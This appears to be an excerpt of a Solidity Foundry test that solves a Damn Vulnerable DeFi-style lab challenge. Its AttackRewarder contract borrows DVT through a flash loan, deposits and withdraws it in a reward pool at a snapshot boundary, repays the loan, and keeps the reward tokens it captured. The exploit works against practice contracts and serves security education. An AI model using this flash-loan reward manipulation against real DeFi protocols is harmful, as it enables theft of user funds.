...
contract TheRewarder is Test {
    ...
    function testExploit() public {
         ...
         * EXPLOIT START *
         */
        console.log("Acc token", theRewarderPool.accToken().totalSupply());
        uint256 AMOUNT = dvt.balanceOf(address(theRewarderPool)) * 2500;
        AttackRewarder ar = new AttackRewarder(dvt, theRewarderPool, flashLoanerPool, attacker);
        ar.requestFlashloan(AMOUNT);
        vm.warp(block.timestamp + 5 days + 1);
        vm.roll(block.number + 1);
        ar.requestFlashloan(AMOUNT);
        ar.sendRewardTokensToAttacker();
        console.log("Reward token attacker", theRewarderPool.rewardToken().balanceOf(attacker));
        /**
         * EXPLOIT END *
         */
        validation();
...
contract AttackRewarder {
    ...
    function receiveFlashLoan(uint256 amount) external {
        // console.log("Balance reward before: ", theRewarderPool.rewardToken().balanceOf(address(this)));
        // console.log("TS reward before: ", theRewarderPool.rewardToken().totalSupply());
        dvt.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        // console.log("Balance accToken", theRewarderPool.accToken().balanceOf(address(this)));
        // console.log("Balance reward after: ", theRewarderPool.rewardToken().balanceOf(address(this)));
        console.log("Acc token balance", theRewarderPool.accToken().balanceOf(address(this)));
        theRewarderPool.withdraw(amount);
        dvt.transfer(address(flashLoanerPool), amount);
        // console.log("Balance reward after: ", theRewarderPool.rewardToken().balanceOf(address(this)));
        // console.log("TS reward after: ", theRewarderPool.rewardToken().totalSupply());
        // console.log("Last reward timestamp", theRewarderPool.lastRewardTimestamps(address(this)));
        // console.log("lastRecordedSnapshotTimestamp", theRewarderPool.lastRecordedSnapshotTimestamp());
    }

    function callDistributeRewards() external {
        theRewarderPool.distributeRewards();
    }

    function sendRewardTokensToAttacker() external {
        uint256 amount = theRewarderPool.rewardToken().balanceOf(address(this));
        console.log("Amount of reward tokens in the contract", amount);
        theRewarderPool.rewardToken().transfer(attacker, amount);
    }
}
